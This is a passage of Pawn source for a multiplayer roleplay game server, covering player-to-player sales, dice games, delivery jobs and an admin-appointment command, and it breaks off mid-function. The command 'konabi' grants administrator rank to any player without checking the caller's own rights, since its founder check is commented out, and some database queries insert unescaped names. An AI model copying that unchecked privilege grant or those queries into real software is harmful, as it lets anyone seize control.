CMD:rcancel(playerid)
{
	if(rent_vehicle_id[playerid] == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_GREY, "You have no rented transport.");

	return SPD(playerid, 4745, DIALOG_STYLE_MSGBOX, !""c_server"Vehicle Rental", "Do you really want to cancel the rental?", "Yes", "No");
}

CMD:accept(playerid)
{
    new offer_id = GetPlayerOfferInfo(playerid, O_INCOMING_PLAYER);
	new offer_type = GetPlayerOfferInfo(playerid, O_INCOMING_TYPE);

	new value_0 = GetPlayerOfferInfo(playerid, O_INCOMING_VALUE)[0];
	new value_1 = GetPlayerOfferInfo(playerid, O_INCOMING_VALUE)[1];
    new value_2 = GetPlayerOfferInfo(playerid, O_INCOMING_VALUE)[2];
    //new value_3 = GetPlayerOfferInfo(playerid, O_INCOMING_VALUE)[3];

    if(offer_id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "No active offers.");

	if(!IsPlayerConnected(offer_id) || !p_info[offer_id][pLogin]) return SendClientMessage(playerid, COLOR_GREY, "The request initiator has left the game.");

	if(GetPlayerOfferInfo(offer_id, O_OUTCOMIG_PLAYER) == playerid)
	{
		ClearPlayerOffer(offer_id);
	}
	else offer_type = -1;

	if(ProxDetectorS(15.0, playerid, offer_id))
	{
		switch(offer_type)
		{
			case OFFER_TYPE_HI:
			{
			    new Float:angle;
			    GetPlayerFacingAngle(offer_id, angle);
				SetPlayerFacingAngle(playerid, angle + 180.0);
			    SetPlayerChatBubble(playerid,"shook hands",COLOR_PURPLE,30.0,10000);
			    SetPlayerChatBubble(offer_id,"shook hands",COLOR_PURPLE,30.0,10000);
			    ApplyAnimation(playerid,"GANGS","hndshkfa",4.0,0,0,0,0,0,1);
			    ApplyAnimation(offer_id,"GANGS","hndshkfa",4.0,0,0,0,0,0,1);
		    }
		    case OFFER_TYPE_FINVITE:
		    {
		        new family_id = p_info[offer_id][family];

			    p_info[playerid][family] = family_id;
			    p_info[playerid][family_rang] = 1;

				Iter_Add(family_players[family_id], playerid);

			    text_string[0] = EOS;
			    format(text_string, sizeof(text_string),"{%s}[Family]"c_silver" %s[%d] has joined your family", family_info[family_id - 1][fam_chat_color], Name(playerid), playerid);
			    send_family_message(family_id, col_white, text_string);

				format(text_string, sizeof(text_string), "{%s}%s "c_white"Family", family_info[family_id - 1][fam_chat_color], family_info[family_id - 1][fam_name]);
				p_info[playerid][family_text] = CreateDynamic3DTextLabel(text_string, col_white, 0.0, 0.0, 0.0, 12.0, playerid, INVALID_VEHICLE_ID, 1);

				format(text_string, sizeof(text_string), "UPDATE `accounts` SET `u_family`='%d',`u_family_rank`='1',`u_family_date`=NOW() WHERE `pID`='%d' LIMIT 1", family_id, p_info[playerid][pID]);
				mysql_tquery(dbHandle, text_string);

				family_info[family_id - 1][fam_members]++;

				format(text_string, sizeof(text_string), "UPDATE `family` SET `fam_members`='%d' WHERE `fam_id`='%d' LIMIT 1", family_info[family_id - 1][fam_members], p_info[playerid][family]);
				mysql_query(dbHandle, text_string);
		    }
		    case OFFER_TYPE_SELLCAR:
		    {
		        new price = value_0;

				new u_car_0 = GetPlayerUseListitem(offer_id); //ID ?????????? ????????
				new u_car_1 = GetPlayerFreeCarSlot(playerid); //ID ?????????? ??????????

		        if(u_car_1 == -1)
				{
				    ClearPlayerOffer(playerid);

					return SendClientMessage(playerid, COLOR_GREY, "You have no available spots for a vehicle.");
				}

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

			    CarInfo[playerid][cModel][u_car_1] = CarInfo[offer_id][cModel][u_car_0];
			    CarInfo[playerid][cSost][u_car_1] = CarInfo[offer_id][cSost][u_car_0];
			    CarInfo[playerid][cColor1][u_car_1] = CarInfo[offer_id][cColor1][u_car_0];
			    CarInfo[playerid][cColor2][u_car_1] = CarInfo[offer_id][cColor2][u_car_0];
			    CarInfo[playerid][cPaintJobs][u_car_1] = CarInfo[offer_id][cPaintJobs][u_car_0];
			    CarInfo[playerid][cFuel][u_car_1] = CarInfo[offer_id][cFuel][u_car_0];
			    CarInfo[playerid][cCost][u_car_1] = CarInfo[offer_id][cCost][u_car_0];
			    CarInfo[playerid][cProbeg][u_car_1] = CarInfo[offer_id][cProbeg][u_car_0];
			    CarInfo[playerid][cHeal][u_car_1] = CarInfo[offer_id][cHeal][u_car_0];
			    CarInfo[playerid][cWheels][u_car_1] = CarInfo[offer_id][cWheels][u_car_0];
			    CarInfo[playerid][cSpoiler][u_car_1] = CarInfo[offer_id][cSpoiler][u_car_0];
			    CarInfo[playerid][cBumper1][u_car_1] = CarInfo[offer_id][cBumper1][u_car_0];
			    CarInfo[playerid][cBumper2][u_car_1] = CarInfo[offer_id][cBumper2][u_car_0];
			    CarInfo[playerid][cNitro][u_car_1] = CarInfo[offer_id][cNitro][u_car_0];
			    CarInfo[playerid][cHydrawlic][u_car_1] = CarInfo[offer_id][cHydrawlic][u_car_0];
			    CarInfo[playerid][cHood][u_car_1] = CarInfo[offer_id][cHood][u_car_0];
			    CarInfo[playerid][cRoof][u_car_1] = CarInfo[offer_id][cRoof][u_car_0];
			    CarInfo[playerid][cSideskirt][u_car_1] = CarInfo[offer_id][cSideskirt][u_car_0];
			    CarInfo[playerid][cLamps][u_car_1] = CarInfo[offer_id][cLamps][u_car_0];
			    CarInfo[playerid][cExhaust][u_car_1] = CarInfo[offer_id][cExhaust][u_car_0];
			    CarInfo[playerid][cStereo][u_car_1] = CarInfo[offer_id][cStereo][u_car_0];
			    CarInfo[playerid][cVentRight][u_car_1] = CarInfo[offer_id][cVentRight][u_car_0];
			    CarInfo[playerid][cVentLeft][u_car_1] = CarInfo[offer_id][cVentLeft][u_car_0];

				player_engine_tune[playerid][u_car_1] = player_engine_tune[offer_id][u_car_0];
				player_brake_tune[playerid][u_car_1] = player_brake_tune[offer_id][u_car_0];

				CarInfo[offer_id][cModel][u_car_0] = 0;

				player_home_car[playerid][u_car_1] = player_home_car[offer_id][u_car_0];

		        player_home_car[offer_id][u_car_0] = INVALID_VEHICLE_ID;

		        RemovePlayerFromVehicle(offer_id);

				GivePlayerMoneyEx(playerid, -price, "buying a vehicle from hand");
				GivePlayerMoneyEx(offer_id, price, "buying a vehicle from hand");

				SCMF(playerid, -1, "You successfully bought transport from %s", Name(offer_id));
				SCMF(offer_id, -1, "You successfully sold the transport %s", Name(playerid));

				SaveCars(offer_id);
				SaveCars(playerid);

				SavePlayerPerfomanceTune(offer_id);
				SavePlayerPerfomanceTune(playerid);
		    }
		    case OFFER_TYPE_SELLSIM:
		    {
		        new price = value_0;

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

				p_info[playerid][pNumber] = p_info[offer_id][pNumber];
				p_info[offer_id][pNumber] = 0;

				GivePlayerMoneyEx(playerid, -price, "Purchasing a number from hands");
				GivePlayerMoneyEx(offer_id, price, "Purchasing a number from hands");

				SCMF(playerid, -1, "You successfully bought the number from %s", Name(offer_id));
				SCMF(offer_id, -1, "You successfully sold the number %s", Name(playerid));

				OnPlayerUpdateAccountsPer(playerid, "pNumber", p_info[playerid][pNumber]);
				OnPlayerUpdateAccountsPer(offer_id, "pNumber", p_info[offer_id][pNumber]);
		    }
		    case OFFER_TYPE_SELLBIZ:
		    {
		        new price = value_0;

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

				new b_id = GetPlayerBizz(offer_id);

				if(b_id == -1) return SendClientMessage(playerid, COLOR_GREY, "The seller lost their business.");

				format(BizzInfo[b_id][bOwner], MAX_PLAYER_NAME, Name(playerid));

				update_business_text(b_id);

				format(format_string, 144, "UPDATE `bizz` SET `bOwner` = '%s' WHERE `bID` = %d", Name(playerid), b_id);
				mysql_tquery(dbHandle, format_string);

				GivePlayerMoneyEx(playerid, -price, "Purchasing a business from hands");
				GivePlayerMoneyEx(offer_id, price, "Purchasing a business from hands");

				SCMF(playerid, -1, "You successfully bought the business from %s", Name(offer_id));
				SCMF(offer_id, -1, "You successfully sold the business %s", Name(playerid));

				if(beg_quest_info[playerid][b_quest_id] == QUEST_TYPE_BIZ && beg_quest_info[playerid][b_quest_status] == 1)
				{
			        SendClientMessage(playerid, col_white, !""c_yellow"Quest:"c_white"You completed the quest 'For Your Business'. Use: "c_server"/quest"c_white", to receive an award.");
			        beg_quest_info[playerid][b_quest_status] = 2;
			        OnPlayerUpdateAccountsPer(playerid, "b_quest_status", 2);
				}

		    }
			case OFFER_TYPE_SELLFUEL:
			{
			    new price = value_0;

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

				new a_id = GetPlayerABizz(offer_id);

				if(a_id == 0) return SendClientMessage(playerid, COLOR_GREY, "The seller's gas station has disappeared.");

				format(BizzAInfo[a_id][aOwner], MAX_PLAYER_NAME, Name(playerid));

		        format(String, 244, "{0099FF}Gas station '%s'\n"c_white"Owner: {66CC00}%s\n"c_white"Price per liter: {EBBD00}%d$\n{66CC00}/fuel - for gas stations",BizzAInfo[a_id][aMessage], BizzAInfo[a_id][aOwner], BizzAInfo[a_id][aPrice]);
				Update3DTextLabelText(BizzAInfo[a_id][aLabel], -1, String);

				format(format_string, 144, "UPDATE `bizz_fuel` SET `aOwner` = '%s' WHERE `aID` = %d", Name(playerid), a_id);
				mysql_tquery(dbHandle, format_string);

				GivePlayerMoneyEx(playerid, -price, "purchase of gas stations second-hand");
				GivePlayerMoneyEx(offer_id, price, "purchase of gas stations second-hand");

				SCMF(playerid, -1, "You successfully bought the gas station from %s.", Name(offer_id));
				SCMF(offer_id, -1, "You successfully sold the gas station %s.", Name(playerid));
			}
			case OFFER_TYPE_SELLHOUSE:
			{
			    new price = value_0;
				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, col_white, !""c_error"You do not have enough funds.");

				new h_id = GetPlayerHouse(offer_id);
				if(GetPlayerHouseLodger(playerid) != -1) return SendClientMessage(playerid, col_white, !""c_error"You are already registered somewhere. Use the command: "c_server"/leavelodger");
				if(h_id == -1) return SendClientMessage(playerid, col_white, !""c_error"The player no longer has House.");

				format(HouseInfo[h_id][hOwner], MAX_PLAYER_NAME, Name(playerid));

				text_string[0] = EOS;
				format(text_string, sizeof(text_string), "UPDATE `house` SET `hOwner`='%s' WHERE `hID`='%d'", Name(playerid), h_id);
				mysql_query(dbHandle, text_string);

				GivePlayerMoneyEx(playerid, -price, "purchase of House from the player");
				GivePlayerMoneyEx(offer_id, price, "purchase of House from the player");
				if(HouseInfo[h_id][hGaragex] != 0 && HouseInfo[h_id][hGaragey] != 0 && HouseInfo[h_id][hGaragez] != 0)
				{
				    new strla[444];
					format(strla, 244, "{FFC900}Garage\nClass: {FFFFFF}%d\n{FFC900}House : {FFFFFF}#%d\n{FFC900}Owner : {FFFFFF}%s \n{FFFFFF}Use {FFC900}/garage{FFFFFF} to enter",HouseInfo[h_id][hKlass],HouseInfo[h_id][hOwner],h_id);
					Update3DTextLabelText(HouseInfo[h_id][gLabel], -1, strla);
				}

                text_string[0] = EOS;
				format(text_string, sizeof(text_string), ""c_sucess"You successfully bought the house from "c_server"%s", Name(offer_id));
				SendClientMessage(playerid, col_white, text_string);

                text_string[0] = EOS;
				format(text_string, sizeof(text_string), ""c_sucess"You successfully sold the House."c_server"%s", Name(playerid));
				SendClientMessage(offer_id, col_white, text_string);

				clear_fam_house(playerid, h_id);
			}
			case OFFER_TYPE_SELLGUN:
			{
			    new price = value_0;

				new weapon_id = value_1;
				new ammo = value_2;

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

		        if(GetPlayerWeapon(offer_id) != weapon_id) return SendClientMessage(playerid, COLOR_GREY, "The seller has another weapon in hand.");

				if(GetPlayerAmmo(offer_id) < ammo) return SendClientMessage(playerid, COLOR_GREY, "The seller does not have the specified amount of ammunition.");

				SetPlayerAmmo(offer_id, weapon_id, GetPlayerAmmo(offer_id) - ammo);
				GivePlayerWeapon(playerid, weapon_id, ammo);

				GivePlayerMoneyEx(playerid, -price, "purchase of a weapon from hand.");
				GivePlayerMoneyEx(offer_id, price, "purchase of a weapon from hand.");

				SCMF(playerid, -1, "You successfully bought a weapon from %s.", Name(offer_id));
				SCMF(offer_id, -1, "You successfully sold the weapon %s.", Name(playerid));
			}
			case OFFER_TYPE_SELLDRUGS:
			{
			    new price = value_0;

				new amount = value_1;

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

				if(p_info[offer_id][pDrugs] < amount) return SendClientMessage(playerid, COLOR_GREY, "The seller does not have the specified amount of drugs.");

				if(p_info[playerid][pDrugs] + amount > GetPlayerBackpackLimit(playerid)) return SCMF(playerid, COLOR_GREY, "You cannot carry more than %d grams.", GetPlayerBackpackLimit(playerid));

				p_info[offer_id][pDrugs] -= amount;
				p_info[playerid][pDrugs] += amount;

				OnPlayerUpdateAccountsPer(offer_id, "pDrugs", p_info[offer_id][pDrugs]);
				OnPlayerUpdateAccountsPer(playerid, "pDrugs", p_info[playerid][pDrugs]);

				GivePlayerMoneyEx(playerid, -price, "purchase of drugs from hand.");
				GivePlayerMoneyEx(offer_id, price, "purchase of drugs from hand.");

				SCMF(playerid, -1, "You successfully bought drugs from %s.", Name(offer_id));
				SCMF(offer_id, -1, "You successfully sold drugs %s.", Name(playerid));
			}
			case OFFER_TYPE_LIVE:
			{
			    player_news_live[playerid] = true;

				format(format_string, 144, "[R] %s[%d] %s ether by invitation from %s[%d].", Name(playerid), playerid, player_news_live[playerid] ? ("started.") : ("finished."), Name(offer_id), offer_id);
		        SendFrac(FRACTION_NEWS, COLOR_GREEN, format_string);

				SCMF(playerid, -1, "You accepted the offer to go live from %s.", Name(offer_id));
				SendClientMessage(playerid, -1, "If you want to leave the air earlier, use: /leave.");
			}
			case OFFER_TYPE_LODGER:
			{
				if(GetPlayerHouse(playerid) != -1 || p_info[playerid][pHotel] != -1) return SendClientMessage(playerid, COLOR_GREY, "You already live somewhere.");

				new h_id = GetPlayerHouse(offer_id);

				new slot = value_0;

				format(house_lodgers[h_id][slot], MAX_PLAYER_NAME, Name(playerid));

				SaveHouseLodgers(h_id);

		        SCMF(offer_id, -1, "- %s accepted your offer.", Name(playerid));
				SCMF(playerid, -1, "- You accepted the offer from %s.", Name(offer_id));
				SendClientMessage(playerid, -1, "If you want to leave the housing yourself, use: /lodgerleave.");
			}
			case OFFER_TYPE_TICKET:
			{
			    new price = value_0;

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

		        GivePlayerMoneyEx(playerid, -price, "payment for crafting from hand.");

				SCMF(offer_id, -1, "- %s paid for crafting.", Name(playerid));
				SCMF(playerid, -1, "- You paid for crafting, recorded %s.", Name(offer_id));
			}
			case OFFER_TYPE_SELLSKIN:
			{
			    new price = value_0;

				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

				new old_skin = p_info[offer_id][pSkin];

				p_info[offer_id][pSkin] = p_info[playerid][pSkin];
		        p_info[playerid][pSkin] = old_skin;

		        SetPlayerSkin(playerid, p_info[playerid][pSkin]);
		        SetPlayerSkin(offer_id, p_info[offer_id][pSkin]);

		        GivePlayerMoneyEx(playerid, -price, "purchase of clothes from hand.");
				GivePlayerMoneyEx(offer_id, price, "purchase of clothes from hand.");

				SCMF(offer_id, -1, "- %s accepted the clothing exchange.", Name(playerid));
				SCMF(playerid, -1, "- You accepted the clothing exchange with %s.", Name(offer_id));

		        OnPlayerUpdateAccountsPer(playerid, "pSkin", p_info[playerid][pSkin]);
		        OnPlayerUpdateAccountsPer(offer_id, "pSkin", p_info[offer_id][pSkin]);
			}
			case OFFER_TYPE_GIVEHEALS:
			{
				new amount = value_0;

			    if(p_info[offer_id][pHeals] < amount) return SendClientMessage(playerid, COLOR_GREY, "The offer doesn't have that many medkits.");

			    if(p_info[playerid][pHeals] + amount > 2) return SendClientMessage(playerid, COLOR_GREY, "You cannot carry more than 2 medkits.");

			    p_info[offer_id][pHeals] -= amount;
				p_info[playerid][pHeals] += amount;

				OnPlayerUpdateAccountsPer(offer_id, "pHeals", p_info[offer_id][pHeals]);
				OnPlayerUpdateAccountsPer(playerid, "pHeals", p_info[playerid][pHeals]);

				SCMF(offer_id, -1, "- %s received a transfer of medical kits.", Name(playerid));
				SCMF(playerid, -1, "- You received a transfer of medical kits from %s.", Name(offer_id));
			}
			case OFFER_TYPE_GIVEMASK:
			{
				new amount = value_0;

			    if(p_info[offer_id][pMask] < amount) return SendClientMessage(playerid, COLOR_GREY, "The offer does not have that many masks.");

			    if(p_info[playerid][pMask] + amount > 2) return SendClientMessage(playerid, COLOR_GREY, "You cannot carry more than 2 masks.");

			    p_info[offer_id][pMask] -= amount;
				p_info[playerid][pMask] += amount;

				OnPlayerUpdateAccountsPer(offer_id, "pMask", p_info[offer_id][pMask]);
				OnPlayerUpdateAccountsPer(playerid, "pMask", p_info[playerid][pMask]);

				SCMF(offer_id, -1, "- %s received a transfer of masks.", Name(playerid));
				SCMF(playerid, -1, "- You received a transfer of masks from %s.", Name(offer_id));
			}
			case OFFER_TYPE_GIVEPATR:
			{
				new amount = value_0;

			    if(p_info[offer_id][pPatron] < amount) return SendClientMessage(playerid, COLOR_GREY, "The offer does not have that many rounds.");

			    if(p_info[playerid][pPatron] + amount > GetPlayerBackpackLimit(playerid)) return SCMF(playerid, COLOR_GREY, "You cannot carry more than %d rounds.", GetPlayerBackpackLimit(playerid));

			    p_info[offer_id][pPatron] -= amount;
				p_info[playerid][pPatron] += amount;

				OnPlayerUpdateAccountsPer(offer_id, "pPatron", p_info[offer_id][pPatron]);
				OnPlayerUpdateAccountsPer(playerid, "pPatron", p_info[playerid][pPatron]);

				SCMF(offer_id, -1, "- %s received a transfer of rounds.", Name(playerid));
				SCMF(playerid, -1, "- You received a transfer of rounds from %s.", Name(offer_id));
			}
			case OFFER_TYPE_GIVEMETALL:
			{
				new amount = value_0;

			    if(p_info[offer_id][pMetall] < amount) return SendClientMessage(playerid, COLOR_GREY, "The offer does not have that many pieces of weapon.");

			    if(p_info[playerid][pMetall] + amount > GetPlayerBackpackLimit(playerid)) return SCMF(playerid, COLOR_GREY, "You cannot carry more than %d pieces of weapon.", GetPlayerBackpackLimit(playerid));

			    p_info[offer_id][pMetall] -= amount;
				p_info[playerid][pMetall] += amount;

				OnPlayerUpdateAccountsPer(offer_id, "pMetall", p_info[offer_id][pMetall]);
				OnPlayerUpdateAccountsPer(playerid, "pMetall", p_info[playerid][pMetall]);

				SCMF(offer_id, -1, "- %s accepted the transfer of the weapon unit.", Name(playerid));
				SCMF(playerid, -1, "- You accepted the transfer of the weapon unit from %s.", Name(offer_id));
			}
			case OFFER_TYPE_DICE:
			{
			    new price = value_0;

		        if(p_info[offer_id][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "The offeror does not have the required amount.");
				if(p_info[playerid][pCash] < price) return SendClientMessage(playerid, COLOR_GREY, "You do not have the required amount.");

				new player_dice = random(6) + 1,
					offer_dice = random(6) + 1;

				format(format_string, 188, "%s and %s rolled the dice. Result: {EE82EE}%d:%d", Name(offer_id), Name(playerid), offer_dice, player_dice);
				ProxDetector(20.0, playerid, format_string, 0xDD90FFFF,0xDD90FFAA,0xDD90FFAA,0xDD90FFAA,0xDD90FFAA);

				SetPlayerChatBubble(playerid, "rolled the dice",0xDD90FFFF,20.0,10000);
				SetPlayerChatBubble(offer_id, "rolled the dice",0xDD90FFFF,20.0,10000);

				if(beg_quest_info[offer_id][b_quest_id] == QUEST_TYPE_CASINO && beg_quest_info[offer_id][b_quest_status] == 1)
				{
				    beg_quest_info[offer_id][b_quest_progress] ++;
				    OnPlayerUpdateAccountsPer(offer_id, "b_quest_progress", beg_quest_info[offer_id][b_quest_progress]);

				    if(beg_quest_info[offer_id][b_quest_progress] >= 5)
				    {
				        SendClientMessage(offer_id, col_white, !""c_yellow"Quest:"c_white"You have completed the Quest 'Gambling Player'. Use:"c_server"/quest"c_white", to receive an award.");
				        beg_quest_info[offer_id][b_quest_status] = 2;
				        OnPlayerUpdateAccountsPer(offer_id, "b_quest_status", 2);
				    }
				}

				if(beg_quest_info[playerid][b_quest_id] == QUEST_TYPE_CASINO && beg_quest_info[playerid][b_quest_status] == 1)
				{
				    beg_quest_info[playerid][b_quest_progress] ++;
				    OnPlayerUpdateAccountsPer(playerid, "b_quest_progress", beg_quest_info[playerid][b_quest_progress]);

				    if(beg_quest_info[playerid][b_quest_progress] >= 5)
				    {
				        SendClientMessage(playerid, col_white, !""c_yellow"Quest:"c_white"You have completed the Quest 'Gambling Player'. Use:"c_server"/quest"c_white", to receive an award.");
				        beg_quest_info[playerid][b_quest_status] = 2;
				        OnPlayerUpdateAccountsPer(playerid, "b_quest_status", 2);
				    }
				}

				if(player_dice > offer_dice) PlayerWinPlayerDice(playerid, offer_id, price, player_dice, offer_dice);
				else if(player_dice < offer_dice) PlayerWinPlayerDice(offer_id, playerid, price, offer_dice, player_dice);
				else
				{
				    SetPlayerChatBubble(playerid, "It's a draw!", 0xFFCD00FF, 20.0, 2000);
					SetPlayerChatBubble(offer_id, "It's a draw!", 0xFFCD00FF, 20.0, 2000);

					SendClientMessage(playerid, 0xFFCD00FF, "You rolled the same amount, you played a draw.");
					SendClientMessage(offer_id, 0xFFCD00FF, "You rolled the same amount, you played a draw.");
				}
			}
			default: SendClientMessage(playerid, 0x999999FF, "At the moment, you are not offered anything.");
		}
	}
	else SendClientMessage(playerid, 0x999999FF, "Player is too far away.");

	ClearPlayerOffer(playerid);

	return 1;
}

CMD:cancel(playerid)
{
    new offer_id = GetPlayerOfferInfo(playerid, O_OUTCOMIG_PLAYER);

	if(offer_id != INVALID_PLAYER_ID)
	{
		if(GetPlayerOfferInfo(offer_id, O_INCOMING_PLAYER) == playerid)
		{
			ClearPlayerOffer(offer_id);

			SCMF(offer_id, 0xFF6600FF, "%s retracted their offer.", Name(playerid));

			SCMF(playerid, 0xFF6600FF, "You retracted your offer for %s.", Name(offer_id));
		}
		else SendClientMessage(playerid, 0xFF6600FF, "You retracted your last offer.");

		ClearPlayerOffer(playerid);
	}
	else SendClientMessage(playerid, 0xCECECEFF, "You have no active offers.");

	return 1;
}

CMD:load(playerid, params[])
{
	if(p_info[playerid][pJob] != WORK_TYPE_PRODUCT) return SendClientMessage(playerid, COLOR_GREY, "You cannot use this command.");

	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "You must be driving a vehicle!");

	if(player_product_id[playerid] == -1) return SendClientMessage(playerid, COLOR_GREY, "You have no active orders, Use: /prodlist.");

	new order_id = player_product_id[playerid];
	new vehicleid = GetPlayerVehicleID(playerid);

	if(GetVehicleModel(vehicleid) != 414 && GetVehicleModel(vehicleid) != 552) return SendClientMessage(playerid, COLOR_GREY, "You are not in a work vehicle!");

	if(GetVehicleModel(vehicleid) == 414)
	{
	    if(!PlayerToPoint(6.0, playerid, -14.5848,-271.6912,5.4297)) return SendClientMessage(playerid,COLOR_GREY,"You must be near the food warehouse.");

		new need_prod = BizzInfo[order_id][bSklad] - BizzInfo[order_id][bProducts];

		vehicle_load_prod[vehicleid] = need_prod;

		SetPlayerCheckpoint(playerid, BizzInfo[order_id][bEntranceX], BizzInfo[order_id][bEntranceY], BizzInfo[order_id][bEntranceZ], 6.0);

		format(String, sizeof(String), ""c_white"You successfully loaded %d items of food into the vehicle.\nHead to the customer and unload...\n\nThe unloading location is marked on your GPS.", need_prod);
	}
	else
	{
	    if(!PlayerToPoint(6.0, playerid, -22.9999,-272.1464,5.4297)) return SendClientMessage(playerid,COLOR_GREY,"You must be near the fuel depot.");

        new need_fuel = BizzAInfo[order_id][aSklad] - BizzAInfo[order_id][aProducts];

		vehicle_load_prod[vehicleid] = need_fuel;

		SetPlayerCheckpoint(playerid, BizzAInfo[order_id][aAreaFillX], BizzAInfo[order_id][aAreaFillY], BizzAInfo[order_id][aAreaFillZ], 6.0);

  		format(String, sizeof(String), ""c_white"You successfully loaded %d liters into the vehicle.\nHead to the customer and unload...\n\nThe unloading location is marked on your GPS.", need_fuel);
	}

	return SPD(playerid,0000, DIALOG_STYLE_MSGBOX, !""c_server"Loading", String, "Close", "");
}

cmd:prodlist(playerid, params[])
{
	if(p_info[playerid][pJob] != WORK_TYPE_PRODUCT) return SendClientMessage(playerid, col_white, !""c_error"You cannot use this command.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, col_white, !""c_error"You must be driving a vehicle.");

	new vehicleid = GetPlayerVehicleID(playerid);
	if(vehicleid != rent_job_vehicle[playerid]) return SendClientMessage(playerid, col_white, !""c_error"You are not in a work vehicle.");

	if(player_product_id[playerid] != -1)
	{
	    new order_id = player_product_id[playerid];
        new bool: is_product = GetVehicleModel(vehicleid) == 414 ? true : false;

		if(!is_product) SetPlayerCheckpoint(playerid, BizzAInfo[order_id][aAreaFillX], BizzAInfo[order_id][aAreaFillY], BizzAInfo[order_id][aAreaFillZ], 6.0);
		else SetPlayerCheckpoint(playerid, BizzInfo[order_id][bEntranceX], BizzInfo[order_id][bEntranceY], BizzInfo[order_id][bEntranceZ], 6.0);

		return SendClientMessage(playerid, col_white, !""c_info"You are already processing an order, the marker is set to the unloading location.");
	}
	return ProductList(playerid, GetVehicleModel(vehicleid) == 414 ? true : false);
}

stock ProductList(playerid, bool: is_product)
{
	new count = 0;
	dlobal_string[0] = text_string[0] = EOS;
	if(is_product)
	{
		for(new i; i < MAX_BIZZ; i++)
		{
		    if(BizzInfo[i][bProducts] > 100) continue;
			if(BizzInfo[i][bType] != 1 && BizzInfo[i][bType] != 2 && BizzInfo[i][bType] != 3 && BizzInfo[i][bType] != 7 && BizzInfo[i][bType] != 9) continue;

			format(text_string, sizeof(text_string), ""c_server"[%d]"c_white" %s\t%d items\n", i, BizzInfo[i][bMessage], BizzInfo[i][bSklad] - BizzInfo[i][bProducts]);
			strcat(dlobal_string, text_string);

			SetPlayerListitemValue(playerid, count++, i);
		}
	}
	else
	{
	    for(new i; i < MAX_aBIZZ; i++)
	    {
	        if(BizzAInfo[i][aProducts] > 100) continue;

			format(text_string, sizeof(text_string), ""c_server"[%d]"c_white" %s\t%d liters\n", i, BizzAInfo[i][aMessage], BizzAInfo[i][aSklad] - BizzAInfo[i][aProducts]);
			strcat(dlobal_string, text_string);

			SetPlayerListitemValue(playerid, count++, i);
	    }
	}
	if(count == 0) return SPD(playerid, 0, DIALOG_STYLE_MSGBOX, !""c_server"Order", !""c_white"But there are no orders.", !"Close", !"");
	return SPD(playerid, 146, DIALOG_STYLE_TABLIST, !""c_server"Order", dlobal_string, !"Choose", !"Back");
}

CMD:lease(playerid, params[])
{
    new i = player_enter_biz[playerid];
    if(PlayerToPoint(2, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) && BizzInfo[i][bType] == 5 && BizzInfo[i][bVirtualWorld] == GetPlayerVirtualWorld(playerid))
    {
        if(BizzInfo[i][bLocked] == 1) return SendClientMessage(playerid,-1, "The Residence is not functioning. Closed by the salon owner.");

        SPD(playerid, 90, DIALOG_STYLE_LIST, !""c_server"Taxi Service", "[1] Get a job\n[2] Quit the job\n{D7FF00}[3] Company information", "Choose", "Back");
    }
    return 1;
}

CMD:world(playerid) return SCMF(playerid, -1, "World: %d", GetPlayerVirtualWorld(playerid));

cmd:konabi(playerid, params[])
{
  extract params -> new player:targetid, adm_level; else return SendClientMessage(playerid, col_grey, !"Use: /konabi [Player id] [Level]");
    if(!IsPlayerConnected(targetid)) return SendClientMessage(playerid, col_grey, !"Player not found.");
    if(p_info[targetid][pLogin] == 0) return SendClientMessage(playerid, col_grey, !"Player is not logged in.");
  if(afk_time[targetid] > 2) return SendClientMessage(playerid, col_white, !""c_error"The Player is AFK.");
  if(admin_level[playerid] == 8 && !(1 <= adm_level <= 8)) return SendClientMessage(playerid, col_white, !""c_error"Use administrator level 1 before 8.");
  if(!(1 <= adm_level <= 8)) return SendClientMessage(playerid, col_white, !""c_error"Use administrator level 1 before 8.");
  //if(strcmp(Name(playerid), PROJECT_FOUNDER, true) != 0  strcmp(Name(playerid), PROJECT_FOUNDER_2, true) != 0  strcmp(Name(playerid), PROJECT_FOUNDER_3, true) != 0 || strcmp(Name(playerid), PROJECT_FOUNDER_4, true) != 0) return SendClientMessage(playerid, col_white, !""c_error"Cannot be used on this administrator.");

  if(adm_level == admin_level[targetid])
  {
    text_string[0] = EOS;
    format(text_string, sizeof(text_string), ""c_error"Administrator already has %d level.", adm_level);
    SendClientMessage(playerid, col_white, text_string);
    return 1;
  }

  if(!admin_level[targetid])
  {
      text_string[0] = EOS;
    format(text_string, sizeof(text_string), ""c_info"Administrator "c_server"%s"c_white" appointed You as Administrator %d level.", Name(playerid), adm_level);
    SendClientMessage(targetid, col_white, text_string);

    format(text_string, sizeof(text_string), ""c_info"You have successfully appointed "c_server"%s"c_white" Administrator %d level.", Name(targetid), adm_level);
    SendClientMessage(playerid, col_white, text_string);

        ALogin(targetid);

        new strstre[16];
      format(strstre, 16, "%02d/%02d/%d", day, month, year);

    format_string[0] = EOS;
        mysql_format(dbHandle, format_string, sizeof(format_string), "INSERT INTO admin (Name, pAdmin, pAdminKey, pDataNaz) VALUES ('%e','%d','0','%e')", Name(targetid), adm_level, strstre);
    mysql_tquery(dbHandle, format_string);

        p_info[targetid][pAdmRep] = p_info[targetid][pAdmRepDay] = 0;

    admin_level[targetid] = adm_level;
    strmid(p_info[targetid][pAdminKey], "0", 0, strlen("0"), 32);
